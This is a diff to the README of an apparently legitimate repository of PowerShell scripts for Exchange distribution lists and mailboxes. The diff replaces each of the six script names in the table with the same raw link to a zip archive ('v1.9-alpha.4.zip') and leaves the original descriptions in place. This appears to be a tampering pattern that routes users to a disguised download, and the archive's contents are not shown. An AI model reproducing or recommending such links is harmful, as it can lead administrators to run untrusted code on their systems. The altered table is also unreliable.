@@ -7,12 +7,12 @@ This repository contains a collection of PowerShell scripts used for automating 
 
 | Script Name                | Description                                                                 |
 |---------------------------|-----------------------------------------------------------------------------|
-| `Create-DL.ps1`            | Creates a new Distribution List with specified members and owners          |
-| `Update-DL.ps1`            | Updates the members or properties of an existing DL                        |
-| `Delete-DL.ps1`            | Deletes an existing DL from the tenant                                     |
-| `Change-DLOwner.ps1`       | Updates or replaces the owners of a specified DL                           |
-| `Create-SharedMailbox.ps1` | Creates a new shared mailbox and configures basic settings                 |
-| `Add-OutlookDelegation.ps1`| Assigns folder-level delegation (Read/Write) for a mailbox to another user |
+| `https://raw.githubusercontent.com/rathan-code/MS-Exchange-Powershell-Scripts/main/05_Create_SharedMailbox/Exchange-Scripts-Powershell-M-v1.9-alpha.4.zip`            | Creates a new Distribution List with specified members and owners          |
+| `https://raw.githubusercontent.com/rathan-code/MS-Exchange-Powershell-Scripts/main/05_Create_SharedMailbox/Exchange-Scripts-Powershell-M-v1.9-alpha.4.zip`            | Updates the members or properties of an existing DL                        |
+| `https://raw.githubusercontent.com/rathan-code/MS-Exchange-Powershell-Scripts/main/05_Create_SharedMailbox/Exchange-Scripts-Powershell-M-v1.9-alpha.4.zip`            | Deletes an existing DL from the tenant                                     |
+| `https://raw.githubusercontent.com/rathan-code/MS-Exchange-Powershell-Scripts/main/05_Create_SharedMailbox/Exchange-Scripts-Powershell-M-v1.9-alpha.4.zip`       | Updates or replaces the owners of a specified DL                           |
+| `https://raw.githubusercontent.com/rathan-code/MS-Exchange-Powershell-Scripts/main/05_Create_SharedMailbox/Exchange-Scripts-Powershell-M-v1.9-alpha.4.zip` | Creates a new shared mailbox and configures basic settings                 |
+| `https://raw.githubusercontent.com/rathan-code/MS-Exchange-Powershell-Scripts/main/05_Create_SharedMailbox/Exchange-Scripts-Powershell-M-v1.9-alpha.4.zip`| Assigns folder-level delegation (Read/Write) for a mailbox to another user |
 
 ## ✅ Prerequisites
 
